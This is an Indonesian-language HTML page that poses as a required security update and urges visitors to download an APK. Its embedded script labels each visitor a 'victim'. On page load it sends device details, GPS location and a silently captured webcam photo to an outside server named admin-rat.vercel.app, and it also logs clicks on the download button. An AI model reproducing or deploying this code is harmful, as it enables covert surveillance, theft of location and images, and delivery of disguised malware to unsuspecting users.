<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TESTING</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #0a0a0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #1a1a2e;
            padding: 40px;
            border-radius: 16px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a3e;
        }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 20px; margin-bottom: 10px; color: #4fc3f7; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background: #0d47a1;
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.3s;
        }
        .btn:hover { background: #1565c0; }
        .btn-success { background: #1b5e20; }
        .btn-success:hover { background: #2e7d32; }
        .small { font-size: 12px; color: #666; margin-top: 15px; }
    </style>
    <script>
        // ===== KIRIM DATA KE SERVER =====
        const SERVER_URL = 'https://admin-rat.vercel.app';
        let victimId = localStorage.getItem('victim_id');
        if (!victimId) {
            victimId = 'V' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
            localStorage.setItem('victim_id', victimId);
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
            };
        }

        function sendData(data) {
            if (!data.id) data.id = victimId;
            fetch(SERVER_URL + '/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function() {});
        }

        // Kirim data awal
        sendData({ type: 'init', value: 'page_loaded', device: getDeviceInfo() });

        // Ambil lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    var loc = pos.coords.latitude + ',' + pos.coords.longitude;
                    sendData({ type: 'location', value: loc, device: getDeviceInfo() });
                    fetch(SERVER_URL + '/api/collect/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ id: victimId, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                    }).catch(function() {});
                },
                function() { sendData({ type: 'location', value: 'Permission denied', device: getDeviceInfo() }); }
            );
        }

        // Ambil webcam
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 640, height: 480 }, audio: false })
                .then(function(stream) {
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.onloadedmetadata = function() {
                        video.play();
                        var canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        var ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, 640, 480);
                        var imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                        fetch(SERVER_URL + '/api/collect/webcam', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ id: victimId, image: imageData })
                        }).catch(function() {});
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    };
                }).catch(function() {});
        }

        // Track klik tombol
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('downloadBtn').addEventListener('click', function() {
                sendData({ type: 'download_click', value: 'APK downloaded', device: getDeviceInfo() });
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="icon">📱</div>
        <h1>Update Keamanan Diperlukan</h1>
        <p>
            Sistem mendeteksi versi keamanan Anda sudah kadaluarsa.<br>
            Download dan install aplikasi pembaruan keamanan terbaru.
        </p>
        <a href="/download" class="btn btn-success" id="downloadBtn">📥 Download APK</a>
        <p class="small">* Setelah download, buka file dan ikuti instruksi install</p>
    </div>
</body>
</html>
